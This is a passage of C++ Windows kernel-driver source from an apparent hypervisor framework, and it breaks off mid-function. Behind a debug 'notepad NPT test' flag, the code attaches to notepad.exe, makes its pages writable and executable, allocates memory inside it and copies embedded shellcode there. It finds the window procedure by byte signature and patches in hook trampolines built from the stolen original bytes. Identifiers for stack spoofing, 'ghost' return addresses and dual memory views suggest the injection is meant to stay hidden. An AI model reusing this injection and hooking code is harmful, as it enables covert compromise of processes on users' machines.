#include "VtEngine.h"
#include "../Security/Utils.h"
#include "../Core/MachenikeString.h"
#include "../Core/StackSpoofConfig.h"

extern "C" {
#include "../vt/VtResidentPayload/hooks/hde64.h"
}

#if ENABLE_DEBUG_SHELLCODE_IMAGE && VT_DEBUG_NOTEPAD_NPT_TEST
#include "DebugShellcodeImage.h"
#endif

#if ENABLE_VT_FRAMEWORK

static volatile LONG s_bVtActive = 0;
static volatile LONG s_bPayloadResident = 0;
static PEPROCESS s_NotepadNptProcess = NULL;
static ULONG64 s_NotepadNptVa = 0;
static ULONG64 s_ShellcodeDualViewProcess = 0;
static ULONG64 s_ShellcodeDualViewShellcodeEntryVa = 0;
static ULONG64 s_HookToShellcodeProcess = 0;
static ULONG64 s_HookToShellcodeHookVa = 0;
static ULONG64 s_HookToShellcodeShellcodeEntryVa = 0;
static PEPROCESS s_NotepadShellcodeProcess = NULL;
static ULONG64 s_NotepadShellcodeBase = 0;
static SIZE_T s_NotepadShellcodeSize = 0;
static ULONG64 s_NotepadShellcodeDataBase = 0;
static SIZE_T s_NotepadShellcodeDataSize = 0;
static ULONG64 s_NotepadShellcodeHookVa = 0;
static ULONG64 s_NotepadGhostRetVa = 0;
static UCHAR s_NotepadShellcodeOriginalHook[64] = {};
static ULONG s_NotepadShellcodeOriginalHookSize = 0;
static ULONG64 s_NotepadShellcodeViewPages[64] = {};
static ULONG s_NotepadShellcodeViewPageCount = 0;
static volatile LONG s_NotepadNptState = 0; // 0=idle, 1=installing, 2=installed, 3=cleaning

#if ENABLE_DEBUG_SHELLCODE_IMAGE && VT_DEBUG_NOTEPAD_NPT_TEST
/*
 * RuntimeSlot 读取必须持有生命周期租约；否则清理线程可能在读取目标进程
 * 的 state 字段前释放 dataBase，造成 ExpWorkerThread 上的 use-after-free。
 */
static volatile LONG s_NotepadShellcodeReaders = 0;

static BOOLEAN VtAcquireNotepadShellcodeLease(_Out_ PEPROCESS *Process,
                                              _Out_ PULONG64 DataBase)
{
    if (!Process || !DataBase)
        return FALSE;

    if (InterlockedCompareExchange(&s_NotepadNptState, 0, 0) != 2)
        return FALSE;

    InterlockedIncrement(&s_NotepadShellcodeReaders);
    if (InterlockedCompareExchange(&s_NotepadNptState, 0, 0) != 2)
    {
        InterlockedDecrement(&s_NotepadShellcodeReaders);
        return FALSE;
    }

    *Process = s_NotepadShellcodeProcess;
    *DataBase = s_NotepadShellcodeDataBase;
    if (!*Process || !*DataBase)
    {
        InterlockedDecrement(&s_NotepadShellcodeReaders);
        *Process = NULL;
        *DataBase = 0;
        return FALSE;
    }

    return TRUE;
}

static VOID VtReleaseNotepadShellcodeLease(VOID)
{
    InterlockedDecrement(&s_NotepadShellcodeReaders);
}

static VOID VtDrainNotepadShellcodeLeases(VOID)
{
    while (InterlockedCompareExchange(&s_NotepadShellcodeReaders, 0, 0) != 0)
    {
        LARGE_INTEGER interval;
        interval.QuadPart = -10000LL; /* 1ms，等待正在进行的 4 字节读取退出 */
        if (g_pGlobalUserVar && g_pGlobalUserVar->Func.KeDelayExecutionThread)
        {
            g_pGlobalUserVar->Func.KeDelayExecutionThread(KernelMode, FALSE, &interval);
        }
        else
        {
            for (ULONG spin = 0; spin < 10000; ++spin)
                YieldProcessor();
        }
    }
}
#endif

typedef NTSTATUS(NTAPI *VtZwProtectVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect);

static BOOLEAN VtAcquireProcessExitLease(_In_ PEPROCESS Process)
{
    if (!Process || !g_pGlobalUserVar ||
        !g_pGlobalUserVar->Func.PsAcquireProcessExitSynchronization ||
        !g_pGlobalUserVar->Func.PsReleaseProcessExitSynchronization)
        return FALSE;

    return NT_SUCCESS(g_pGlobalUserVar->Func.PsAcquireProcessExitSynchronization(Process));
}

static VOID VtReleaseProcessExitLease(_In_ PEPROCESS Process)
{
    if (Process && g_pGlobalUserVar && g_pGlobalUserVar->Func.PsReleaseProcessExitSynchronization)
        g_pGlobalUserVar->Func.PsReleaseProcessExitSynchronization(Process);
}

static BOOLEAN VtWriteProcessPrivate(_In_ PEPROCESS Process,
                                     _In_ ULONG64 Va,
                                     _In_reads_bytes_(Size) const VOID *Buffer,
                                     _In_ ULONG Size)
{
    if (!Process || !Va || !Buffer || !Size || !g_pGlobalUserVar ||
        !g_pGlobalUserVar->Func.KeStackAttachProcess ||
        !g_pGlobalUserVar->Func.KeUnstackDetachProcess ||
        !g_pGlobalUserVar->KernelBase.QuadPart)
    {
        return FALSE;
    }

    if (!VtAcquireProcessExitLease(Process))
    {
        DBG("[-] Notepad NPT test: process exit synchronization unavailable for write process=%p va=0x%llX",
            Process, Va);
        return FALSE;
    }

    ULONG_PTR protectAddress = 0;
    if (!Utils::GetModuleExport((ULONG_PTR)g_pGlobalUserVar->KernelBase.QuadPart,
                                str_ZwProtectVirtualMemory, &protectAddress) || !protectAddress)
    {
        DBG("[-] Notepad NPT test: ZwProtectVirtualMemory resolve failed");
        VtReleaseProcessExitLease(Process);
        return FALSE;
    }

    KAPC_STATE apc = {};
    g_pGlobalUserVar->Func.KeStackAttachProcess(Process, &apc);
    PVOID base = (PVOID)(ULONG_PTR)(Va & ~(ULONG64)(PAGE_SIZE - 1));
    SIZE_T region = (SIZE_T)((Va & (PAGE_SIZE - 1)) + Size);
    ULONG oldProtect = 0;
    BOOLEAN copied = FALSE;
    const NTSTATUS protectStatus = ((VtZwProtectVirtualMemory)(ULONG_PTR)protectAddress)(
        (HANDLE)(LONG_PTR)-1, &base, &region, PAGE_EXECUTE_READWRITE, &oldProtect);
    if (NT_SUCCESS(protectStatus))
    {
        __try
        {
            RtlCopyMemory((PVOID)(ULONG_PTR)Va, Buffer, Size);
            copied = (RtlCompareMemory((PVOID)(ULONG_PTR)Va, Buffer, Size) == Size);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            copied = FALSE;
        }

        ULONG ignoredProtect = 0;
        const NTSTATUS restoreStatus = ((VtZwProtectVirtualMemory)(ULONG_PTR)protectAddress)(
            (HANDLE)(LONG_PTR)-1, &base, &region, oldProtect, &ignoredProtect);
        if (!NT_SUCCESS(restoreStatus))
        {
            DBG("[-] Notepad NPT test: process page protection restore failed va=0x%llX status=0x%08X",
                Va, restoreStatus);
            copied = FALSE;
        }
    }
    else
    {
        DBG("[-] Notepad NPT test: process page protection change failed va=0x%llX status=0x%08X",
            Va, protectStatus);
    }
    g_pGlobalUserVar->Func.KeUnstackDetachProcess(&apc);
    VtReleaseProcessExitLease(Process);
    return copied;
}

static BOOLEAN VtReadProcessPrivate(_In_ PEPROCESS Process,
                                    _In_ ULONG64 Va,
                                    _Out_writes_bytes_(Size) VOID *Buffer,
                                    _In_ ULONG Size)
{
    if (!Process || !Va || !Buffer || !Size ||
        !g_pGlobalUserVar ||
        !g_pGlobalUserVar->Func.KeStackAttachProcess ||
        !g_pGlobalUserVar->Func.KeUnstackDetachProcess)
    {
        return FALSE;
    }

    if (!VtAcquireProcessExitLease(Process))
    {
        DBG("[-] Notepad NPT test: process exit synchronization unavailable for read process=%p va=0x%llX",
            Process, Va);
        return FALSE;
    }

    KAPC_STATE apc = {};
    g_pGlobalUserVar->Func.KeStackAttachProcess(Process, &apc);
    BOOLEAN copied = FALSE;
    __try
    {
        RtlCopyMemory(Buffer, (const VOID *)(ULONG_PTR)Va, Size);
        copied = TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        copied = FALSE;
    }
    g_pGlobalUserVar->Func.KeUnstackDetachProcess(&apc);
    VtReleaseProcessExitLease(Process);
    return copied;
}

#if ENABLE_DEBUG_SHELLCODE_IMAGE && VT_DEBUG_NOTEPAD_NPT_TEST
// DebugShellcode::RuntimeSlot 的固定用户态布局；state 偏移保持 ADR-0142 契约不变。
static constexpr ULONG kRuntimeSlotStateOffset = 0x10;
static constexpr ULONG kRuntimeSlotPlanOffset = 0x34;
#endif

#if ENABLE_DEBUG_SHELLCODE_IMAGE && VT_DEBUG_NOTEPAD_NPT_TEST
static BOOLEAN VtIsNotepadImageName(_In_opt_ PCHAR ImageName)
{
    static const CHAR kNotepadName[] = "notepad.exe";
    if (!ImageName)
        return FALSE;
    for (SIZE_T i = 0; kNotepadName[i] != '\0'; ++i)
    {
        CHAR lhs = ImageName[i];
        CHAR rhs = kNotepadName[i];
        if (lhs >= 'A' && lhs <= 'Z')
            lhs = (CHAR)(lhs - 'A' + 'a');
        if (lhs != rhs)
            return FALSE;
    }
    return ImageName[sizeof(kNotepadName) - 1] == '\0';
}

static BOOLEAN VtScanNotepadWndProcSection(_In_ ULONG64 Cr3,
                                           _In_ ULONG64 ImageBase,
                                           _In_ ULONG SectionRva,
                                           _In_ ULONG SectionSize,
                                           _In_ ULONG ImageSize,
                                           _Out_ PULONG64 TargetVa,
                                           _Out_ PULONG MatchCount)
{
    static const UCHAR kWndProcHead[] = {
        0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57,
        0x48, 0x8D, 0xAC, 0x24, 0x10, 0xFE, 0xFF, 0xFF,
        0x48, 0x81, 0xEC, 0xF0, 0x02, 0x00, 0x00
    };
    static const UCHAR kWndProcTail[] = {
        0x89, 0x54, 0x24, 0x50,
        0xB9, 0x11, 0x01, 0x00, 0x00,
        0x4C, 0x89, 0x4C, 0x24, 0x48,
        0x4D, 0x8B, 0xF1, 0x49, 0x8B, 0xD8
    };
    constexpr ULONG tailOffset = 0x2E;
    constexpr ULONG signatureSize = tailOffset + RTL_NUMBER_OF(kWndProcTail);

    if (!Cr3 || !ImageBase || !TargetVa || !MatchCount || !SectionSize ||
        SectionRva >= ImageSize || SectionSize > ImageSize - SectionRva ||
        SectionSize < signatureSize)
    {
        return FALSE;
    }

    *TargetVa = 0;
    *MatchCount = 0;

    UCHAR carry[signatureSize] = {};
    UCHAR chunk[PAGE_SIZE + signatureSize] = {};
    ULONG carrySize = 0;
    ULONG scanOffset = 0;
    while (scanOffset < SectionSize)
    {
        const ULONG request = (SectionSize - scanOffset) > PAGE_SIZE
            ? PAGE_SIZE
            : (SectionSize - scanOffset);
        if (carrySize)
            RtlCopyMemory(chunk, carry, carrySize);

        const SIZE_T copied = VtEngine::ReadVirtualMemory(
            Cr3,
            ImageBase + SectionRva + scanOffset,
            chunk + carrySize,
            request);
        if (copied != request)
        {
            DBG("[-] Notepad NPT test: dynamic WndProc scan read failed rva=0x%lX requested=%lu copied=%llu",
                SectionRva + scanOffset, request, (ULONG64)copied);
            return FALSE;
        }

        const ULONG available = carrySize + request;
        for (ULONG i = 0; i + signatureSize <= available; ++i)
        {
            if (RtlCompareMemory(chunk + i, kWndProcHead, RTL_NUMBER_OF(kWndProcHead)) != RTL_NUMBER_OF(kWndProcHead) ||
                RtlCompareMemory(chunk + i + tailOffset, kWndProcTail, RTL_NUMBER_OF(kWndProcTail)) != RTL_NUMBER_OF(kWndProcTail))
            {
                continue;
            }

            const ULONG candidateOffset = scanOffset - carrySize + i;
            if (candidateOffset + signatureSize < candidateOffset ||
                candidateOffset + signatureSize <= scanOffset)
            {
                // 仅保留跨当前页边界的候选，避免 carry 区域中的旧匹配重复计数。
                continue;
            }

            const ULONG candidateRva = SectionRva + candidateOffset;
            if (candidateRva < SectionRva || candidateRva + signatureSize < candidateRva ||
                candidateRva + signatureSize > SectionRva + SectionSize)
            {
                continue;
            }

            ++(*MatchCount);
            *TargetVa = ImageBase + candidateRva;
        }

        const ULONG keep = (available > signatureSize - 1) ? signatureSize - 1 : available;
        if (keep)
            RtlCopyMemory(carry, chunk + available - keep, keep);
        carrySize = keep;
        scanOffset += request;
    }

    return TRUE;
}

static BOOLEAN VtPrefaultNotepadRange(_In_ PEPROCESS Process,
                                      _In_ ULONG64 Base,
                                      _In_ ULONG Size)
{
    if (!Process || !Base || !Size || !g_pGlobalUserVar ||
        !g_pGlobalUserVar->Func.KeStackAttachProcess ||
        !g_pGlobalUserVar->Func.KeUnstackDetachProcess)
    {
        return FALSE;
    }

    KAPC_STATE apc = {};
    BOOLEAN ok = TRUE;
    g_pGlobalUserVar->Func.KeStackAttachProcess(Process, &apc);
    for (ULONG offset = 0; offset < Size; offset += PAGE_SIZE)
    {
        __try
        {
            volatile UCHAR touched = *(volatile UCHAR *)(Base + offset);
            UNREFERENCED_PARAMETER(touched);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            DBG("[-] Notepad NPT test: executable page prefault failed va=0x%llX exception=0x%lX",
                Base + offset, (ULONG)GetExceptionCode());
            ok = FALSE;
            break;
        }
    }
    g_pGlobalUserVar->Func.KeUnstackDetachProcess(&apc);
    return ok;
}

static BOOLEAN VtResolveNotepadWndProc(_In_ PEPROCESS Process,
                                       _In_ ULONG64 Cr3,
                                       _In_ ULONG64 ImageBase,
                                       _Out_ PULONG64 TargetVa)
{
    if (!Cr3 || !ImageBase || !TargetVa)
        return FALSE;
    *TargetVa = 0;
    DBG("[*] Notepad NPT test: resolve WndProc dynamically image=0x%llX", ImageBase);

    IMAGE_DOS_HEADER dos = {};
    if (VtEngine::ReadVirtualMemory(Cr3, ImageBase, &dos, sizeof(dos)) != sizeof(dos) ||
        dos.e_magic != IMAGE_DOS_SIGNATURE || dos.e_lfanew < (LONG)sizeof(IMAGE_DOS_HEADER) ||
        dos.e_lfanew > 0x100000)
    {
        DBG("[-] Notepad NPT test: invalid DOS header image=0x%llX", ImageBase);
        return FALSE;
    }

    const ULONG64 ntVa = ImageBase + (ULONG64)(ULONG)dos.e_lfanew;
    IMAGE_NT_HEADERS64 nt = {};
    if (VtEngine::ReadVirtualMemory(Cr3, ntVa, &nt, sizeof(nt)) != sizeof(nt) ||
        nt.Signature != IMAGE_NT_SIGNATURE || nt.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
        nt.OptionalHeader.SizeOfImage < PAGE_SIZE || nt.FileHeader.NumberOfSections == 0 ||
        nt.FileHeader.NumberOfSections > 96 || nt.FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64))
    {
        DBG("[-] Notepad NPT test: invalid NT header nt=0x%llX", ntVa);
        return FALSE;
    }

    const ULONG64 sectionsVa = ntVa + sizeof(ULONG) + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    const ULONG64 imageEnd = ImageBase + (ULONG64)nt.OptionalHeader.SizeOfImage;
    if (imageEnd < ImageBase || sectionsVa < ntVa ||
        sectionsVa + (ULONG64)nt.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER) < sectionsVa ||
        sectionsVa + (ULONG64)nt.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER) > imageEnd)
    {
        DBG("[-] Notepad NPT test: invalid section table sections=0x%llX image_end=0x%llX",
            sectionsVa, imageEnd);
        return FALSE;
    }
    for (ULONG pass = 0; pass < 2; ++pass)
    {
        for (USHORT i = 0; i < nt.FileHeader.NumberOfSections; ++i)
        {
            IMAGE_SECTION_HEADER section = {};
            const ULONG64 sectionVa = sectionsVa + (ULONG64)i * sizeof(IMAGE_SECTION_HEADER);
            if (VtEngine::ReadVirtualMemory(Cr3, sectionVa, &section, sizeof(section)) != sizeof(section))
            {
                DBG("[-] Notepad NPT test: section read failed index=%hu va=0x%llX", i, sectionVa);
                return FALSE;
            }

            CHAR sectionName[IMAGE_SIZEOF_SHORT_NAME + 1] = {};
            RtlCopyMemory(sectionName, section.Name, IMAGE_SIZEOF_SHORT_NAME);
            const BOOLEAN isText = RtlCompareMemory(sectionName, ".text", 5) == 5;
            const BOOLEAN executable = (section.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            if (!executable || (pass == 0 ? !isText : isText))
                continue;

            const ULONG sectionSize = section.Misc.VirtualSize ? section.Misc.VirtualSize : section.SizeOfRawData;
            if (!sectionSize || section.VirtualAddress >= nt.OptionalHeader.SizeOfImage ||
                sectionSize > nt.OptionalHeader.SizeOfImage - section.VirtualAddress ||
                sectionSize > 0x02000000)
            {
                DBG("[-] Notepad NPT test: executable section bounds invalid section=%s rva=0x%lX size=0x%lX image=0x%lX",
                    sectionName, section.VirtualAddress, sectionSize, nt.OptionalHeader.SizeOfImage);
                return FALSE;
            }
            if (!VtPrefaultNotepadRange(Process, ImageBase + section.VirtualAddress, sectionSize))
            {
                DBG("[-] Notepad NPT test: executable section prefault failed section=%s rva=0x%lX size=0x%lX",
                    sectionName, section.VirtualAddress, sectionSize);
                return FALSE;
            }
            ULONG64 candidateVa = 0;
            ULONG matchCount = 0;
            if (!VtScanNotepadWndProcSection(Cr3, ImageBase, section.VirtualAddress, sectionSize,
                                              nt.OptionalHeader.SizeOfImage, &candidateVa, &matchCount))
            {
                return FALSE;
            }
            if (matchCount != 1 || !candidateVa || candidateVa < ImageBase ||
                candidateVa >= 0x0000800000000000ULL)
            {
                DBG("[-] Notepad NPT test: dynamic WndProc signature %s matches=%lu section=%s rva=0x%lX",
                    matchCount == 1 ? "invalid" : "ambiguous", matchCount, sectionName, section.VirtualAddress);
                return FALSE;
            }

            *TargetVa = candidateVa;
            DBG("[*] Notepad NPT test: dynamic WndProc resolved va=0x%llX rva=0x%llX section=%s matches=%lu",
                candidateVa, candidateVa - ImageBase, sectionName, matchCount);
            return TRUE;
        }
    }
    DBG("[-] Notepad NPT test: dynamic WndProc signature not found in executable sections");
    return FALSE;
}

struct VT_EMBEDDED_SECTION
{
    ULONG Rva;
    ULONG VirtualSize;
    ULONG RawOffset;
    ULONG RawSize;
};

static BOOLEAN VtEmbeddedGetSection(_In_z_ const CHAR* Name, _Out_ VT_EMBEDDED_SECTION* Section)
{
    if (!Name || !Section || g_DebugShellcodeImageSize < sizeof(IMAGE_DOS_HEADER))
        return FALSE;

    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(g_DebugShellcodeImage);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE || dos->e_lfanew < (LONG)sizeof(IMAGE_DOS_HEADER) ||
        (ULONG)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > g_DebugShellcodeImageSize)
    {
        return FALSE;
    }

    const auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(g_DebugShellcodeImage + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
        nt->FileHeader.NumberOfSections == 0 || nt->FileHeader.NumberOfSections > 32)
    {
        return FALSE;
    }

    const auto* sections = IMAGE_FIRST_SECTION(nt);
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; ++i)
    {
        CHAR currentName[IMAGE_SIZEOF_SHORT_NAME + 1] = {};
        RtlCopyMemory(currentName, sections[i].Name, IMAGE_SIZEOF_SHORT_NAME);
        BOOLEAN nameMatch = TRUE;
        for (ULONG c = 0; c < IMAGE_SIZEOF_SHORT_NAME + 1; ++c)
        {
            if (currentName[c] != Name[c])
            {
                nameMatch = FALSE;
                break;
            }
            if (currentName[c] == '\0')
                break;
        }
        if (!nameMatch)
            continue;

        const ULONG rawEnd = sections[i].PointerToRawData + sections[i].SizeOfRawData;
        if (rawEnd < sections[i].PointerToRawData || rawEnd > g_DebugShellcodeImageSize)
            return FALSE;

        Section->Rva = sections[i].VirtualAddress;
        Section->VirtualSize = sections[i].Misc.VirtualSize ? sections[i].Misc.VirtualSize : sections[i].SizeOfRawData;
        Section->RawOffset = sections[i].PointerToRawData;
        Section->RawSize = sections[i].SizeOfRawData;
        return Section->Rva != 0 && Section->VirtualSize != 0;
    }
    return FALSE;
}

static BOOLEAN VtEmbeddedAllocate(_In_ PEPROCESS Process, _In_ SIZE_T Size, _In_ ULONG Protect, _Out_ PULONG64 Base)
{
    if (!Process || !Size || !Base || !g_pGlobalUserVar ||
        !g_pGlobalUserVar->Func.KeStackAttachProcess || !g_pGlobalUserVar->Func.KeUnstackDetachProcess ||
        !g_pGlobalUserVar->Func.ZwAllocateVirtualMemory)
    {
        DBG("[-] Notepad NPT test: target allocation prerequisites failed process=%p size=0x%llX protect=0x%lX",
            Process, (ULONG64)Size, Protect);
        return FALSE;
    }

    *Base = 0;
    if (!VtAcquireProcessExitLease(Process))
    {
        DBG("[-] Notepad NPT test: process exit synchronization unavailable for allocation process=%p size=0x%llX",
            Process, (ULONG64)Size);
        return FALSE;
    }

    KAPC_STATE apc = {};
    g_pGlobalUserVar->Func.KeStackAttachProcess(Process, &apc);
    PVOID address = NULL;
    SIZE_T regionSize = Size;
    const NTSTATUS status = g_pGlobalUserVar->Func.ZwAllocateVirtualMemory(
        (HANDLE)(LONG_PTR)-1, &address, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, Protect);
    BOOLEAN pagesResident = FALSE;
    if (NT_SUCCESS(status) && address && regionSize >= Size)
    {
        pagesResident = TRUE;
        __try
        {
            volatile UCHAR* const touch = (volatile UCHAR*)address;
            for (SIZE_T offset = 0; offset < regionSize; offset += PAGE_SIZE)
                touch[offset] = 0;
            touch[regionSize - 1] = 0;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            pagesResident = FALSE;
        }
        if (!pagesResident)
        {
            PVOID freeAddress = address;
            SIZE_T freeSize = 0;
            g_pGlobalUserVar->Func.ZwFreeVirtualMemory(
                (HANDLE)(LONG_PTR)-1, &freeAddress, &freeSize, MEM_RELEASE);
            address = NULL;
            regionSize = 0;
        }
    }
    g_pGlobalUserVar->Func.KeUnstackDetachProcess(&apc);
    VtReleaseProcessExitLease(Process);
    if (!NT_SUCCESS(status) || !address || regionSize < Size || !pagesResident)
    {
        DBG("[-] Notepad NPT test: target allocation/prefault failed status=0x%08X requested=0x%llX returned=0x%llX address=0x%llX resident=%d",
            status, (ULONG64)Size, (ULONG64)regionSize, (ULONG64)(ULONG_PTR)address, pagesResident);
        return FALSE;
    }

    *Base = (ULONG64)(ULONG_PTR)address;
    DBG("[+] Notepad NPT test: target allocation base=0x%llX size=0x%llX protect=0x%lX pages_prefaulted=1",
        *Base, (ULONG64)regionSize, Protect);
    return TRUE;
}

static BOOLEAN VtEmbeddedFree(_In_ PEPROCESS Process, _Inout_ PULONG64 Base, _Inout_ PSIZE_T Size)
{
    if (!Process || !Base || !*Base || !Size || !g_pGlobalUserVar ||
        !g_pGlobalUserVar->Func.KeStackAttachProcess || !g_pGlobalUserVar->Func.KeUnstackDetachProcess ||
        !g_pGlobalUserVar->Func.ZwFreeVirtualMemory)
    {
        return FALSE;
    }

    if (!VtAcquireProcessExitLease(Process))
    {
        const BOOLEAN processExited =
            g_pGlobalUserVar->Func.PsGetProcessExitStatus &&
            g_pGlobalUserVar->Func.PsGetProcessExitStatus(Process) != STATUS_PENDING;
        if (processExited)
        {
            *Base = 0;
            *Size = 0;
        }
        DBG("[-] Notepad NPT test: process exit synchronization unavailable for free process=%p base=0x%llX exited=%d",
            Process, *Base, processExited);
        return FALSE;
    }

    KAPC_STATE apc = {};
    g_pGlobalUserVar->Func.KeStackAttachProcess(Process, &apc);
    PVOID address = (PVOID)(ULONG_PTR)*Base;
    SIZE_T regionSize = 0;
    const NTSTATUS status = g_pGlobalUserVar->Func.ZwFreeVirtualMemory(
        (HANDLE)(LONG_PTR)-1, &address, &regionSize, MEM_RELEASE);
    g_pGlobalUserVar->Func.KeUnstackDetachProcess(&apc);
    VtReleaseProcessExitLease(Process);
    if (!NT_SUCCESS(status))
    {
        DBG("[-] Notepad NPT test: target free failed base=0x%llX status=0x%08X", (ULONG64)(ULONG_PTR)address,
            status);
        return FALSE;
    }

    *Base = 0;
    *Size = 0;
    DBG("[*] Notepad NPT test: target free complete");
    return TRUE;
}

static BOOLEAN VtEmbeddedCopyText(_In_ PEPROCESS Process, _In_ ULONG64 TextBase)
{
    VT_EMBEDDED_SECTION text = {};
    if (!VtEmbeddedGetSection(".text", &text) || !text.RawSize || !text.VirtualSize)
    {
        DBG("[-] Notepad NPT test: embedded .text metadata invalid");
        return FALSE;
    }

    DBG("[*] Notepad NPT test: copy embedded .text in target process view process=%p text_base=0x%llX rva=0x%lX raw=0x%lX virtual=0x%lX",
        Process, TextBase, text.Rva, text.RawSize, text.VirtualSize);
    const BOOLEAN copied = VtWriteProcessPrivate(
        Process, TextBase, g_DebugShellcodeImage + text.RawOffset, text.RawSize);
    if (!copied)
    {
        DBG("[-] Notepad NPT test: copy embedded .text/readback verification failed");
        return FALSE;
    }

    DBG("[+] Notepad NPT test: embedded .text copied; other PE sections were not written");
    return TRUE;
}

static BOOLEAN VtEmbeddedPatchRuntime(_In_ PEPROCESS Process, _In_ ULONG64 TextBase, _In_ ULONG64 SlotVa,
                                      _In_ ULONG64 DispatchVa, _In_ ULONG64 ResumeVa,
                                      _In_reads_bytes_(OriginalSize) const UCHAR *OriginalBytes,
                                      _In_ ULONG OriginalSize)
{
    VT_EMBEDDED_SECTION text = {};
    if (!VtEmbeddedGetSection(".text", &text))
        return FALSE;

    static const UCHAR slotPattern[] = { 0x49, 0xBB, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11 };
    static const UCHAR dispatchPattern[] = { 0x49, 0xBA, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
    static const UCHAR resumePattern[] = { 0x48, 0xB8, 0x11, 0x00, 0xFF, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA };
    static const UCHAR stolenMarker[] = {
        0xF1, 0xCE, 0xFA, 0xCE, 0xF1, 0xCE, 0xFA, 0xCE,
        0xF1, 0xCE, 0xFA, 0xCE, 0xF1, 0xCE, 0xFA, 0xCE
    };
    ULONG slotOffset = MAXULONG;
    ULONG dispatchOffset = MAXULONG;
    ULONG resumeOffset = MAXULONG;
    ULONG stolenOffset = MAXULONG;
    for (ULONG i = 0; i + sizeof(slotPattern) <= text.RawSize; ++i)
    {
        if (RtlCompareMemory(g_DebugShellcodeImage + text.RawOffset + i, slotPattern, sizeof(slotPattern)) == sizeof(slotPattern))
        {
            slotOffset = i + 2;
            break;
        }
    }
    for (ULONG i = 0; i + sizeof(dispatchPattern) <= text.RawSize; ++i)
    {
        if (RtlCompareMemory(g_DebugShellcodeImage + text.RawOffset + i, dispatchPattern, sizeof(dispatchPattern)) == sizeof(dispatchPattern))
        {
            dispatchOffset = i + 2;
            break;
        }
    }
    for (ULONG i = 0; i + sizeof(resumePattern) <= text.RawSize; ++i)
    {
        if (RtlCompareMemory(g_DebugShellcodeImage + text.RawOffset + i, resumePattern, sizeof(resumePattern)) == sizeof(resumePattern))
        {
            resumeOffset = i + 2;
            break;
        }
    }
    for (ULONG i = 0; i + sizeof(stolenMarker) <= text.RawSize; ++i)
    {
        if (RtlCompareMemory(g_DebugShellcodeImage + text.RawOffset + i, stolenMarker, sizeof(stolenMarker)) == sizeof(stolenMarker))
        {
            stolenOffset = i;
            break;
        }
    }
    DBG("[*] Notepad NPT test: runtime patch scan text_rva=0x%lX raw=0x%lX slot=%s@0x%lX dispatch=%s@0x%lX resume=%s@0x%lX stolen=%s@0x%lX size=%lu",
        text.Rva, text.RawSize, slotOffset == MAXULONG ? "missing" : "found", slotOffset,
        dispatchOffset == MAXULONG ? "missing" : "found", dispatchOffset,
        resumeOffset == MAXULONG ? "missing" : "found", resumeOffset,
        stolenOffset == MAXULONG ? "missing" : "found", stolenOffset, OriginalSize);
    if (slotOffset == MAXULONG || dispatchOffset == MAXULONG || resumeOffset == MAXULONG ||
        stolenOffset == MAXULONG || !OriginalBytes || !OriginalSize || OriginalSize > 64 ||
        stolenOffset > text.RawSize || OriginalSize > text.RawSize - stolenOffset ||
        text.RawSize - stolenOffset - OriginalSize < 12)
        return FALSE;

    const SIZE_T slotWritten = VtWriteProcessPrivate(
        Process, TextBase + slotOffset, &SlotVa, sizeof(SlotVa)) ? sizeof(SlotVa) : 0;
    const SIZE_T dispatchWritten = VtWriteProcessPrivate(
        Process, TextBase + dispatchOffset, &DispatchVa, sizeof(DispatchVa)) ? sizeof(DispatchVa) : 0;
    const SIZE_T resumeWritten = VtWriteProcessPrivate(
        Process, TextBase + resumeOffset, &ResumeVa, sizeof(ResumeVa)) ? sizeof(ResumeVa) : 0;
    const SIZE_T stolenWritten = VtWriteProcessPrivate(
        Process, TextBase + stolenOffset, OriginalBytes, OriginalSize) ? OriginalSize : 0;
    UCHAR stolenResumeJump[12] = {};
    stolenResumeJump[0] = 0x48;
    stolenResumeJump[1] = 0xB8;
    RtlCopyMemory(stolenResumeJump + 2, &ResumeVa, sizeof(ResumeVa));
    stolenResumeJump[10] = 0xFF;
    stolenResumeJump[11] = 0xE0;
    const SIZE_T stolenResumeWritten = VtWriteProcessPrivate(
        Process, TextBase + stolenOffset + OriginalSize,
        stolenResumeJump, sizeof(stolenResumeJump)) ? sizeof(stolenResumeJump) : 0;
    DBG("[*] Notepad NPT test: runtime patch writes slot=%llu/%llu dispatch=%llu/%llu resume=%llu/%llu stolen=%llu/%lu stolen_resume=%llu/%llu",
        (ULONG64)slotWritten, (ULONG64)sizeof(SlotVa), (ULONG64)dispatchWritten, (ULONG64)sizeof(DispatchVa),
        (ULONG64)resumeWritten, (ULONG64)sizeof(ResumeVa), (ULONG64)stolenWritten, OriginalSize,
        (ULONG64)stolenResumeWritten, (ULONG64)sizeof(stolenResumeJump));
    return slotWritten == sizeof(SlotVa) && dispatchWritten == sizeof(DispatchVa) &&
           resumeWritten == sizeof(ResumeVa) && stolenWritten == OriginalSize &&
           stolenResumeWritten == sizeof(stolenResumeJump);
}

static BOOLEAN VtDecodeHookPatchSize(_In_ ULONG64 Cr3, _In_ ULONG64 HookVa,
